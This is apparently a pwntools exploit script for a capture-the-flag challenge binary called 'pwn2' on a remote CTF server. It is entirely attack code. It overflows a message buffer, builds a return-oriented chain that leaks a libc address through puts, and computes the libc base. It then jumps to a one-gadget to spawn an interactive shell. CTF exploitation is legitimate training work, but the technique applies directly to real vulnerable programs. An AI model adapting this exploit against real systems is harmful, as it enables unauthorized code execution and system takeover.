from pwn import *

#p = process('./pwn2')
p = remote('79gq4l5zpv1aogjgw6yhhymi4.ctf.p0wnhub.com', 21337)
e = ELF('./pwn2')
l = e.libc

p.sendlineafter('>', 'smsg')

for i in range(80):
	print i
	p.recvuntil('->')
	p.send('a'*0x40)
	p.recvuntil('(Y/N)')
	p.sendline('N')

prdi = 0x000000000040155b

pay = p64(prdi)+p64(e.got['read'])+p64(e.plt['puts'])
pay += p64(e.sym['smsg'])

p.sendafter('->', 'a'*7+pay)
p.recvuntil('(Y/N)')
p.sendline('Y')

libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - l.sym['read']
prcx = libc + 0x000000000003eb0b
magic = libc + 0x4f2c5

print hex(libc)

for i in range(87):
	print i
	p.recvuntil('->')
	p.send('a'*0x40)
	p.recvuntil('(Y/N)')
	p.sendline('N')

pay = p64(prcx)+p64(0)+p64(magic)

p.sendafter('->', pay)
p.recvuntil('(Y/N)')
p.sendline('Y')

p.interactive()
